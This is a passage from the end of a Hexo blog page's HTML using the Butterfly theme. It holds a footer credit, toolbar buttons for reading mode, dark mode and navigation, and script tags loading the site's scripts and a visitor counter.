class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
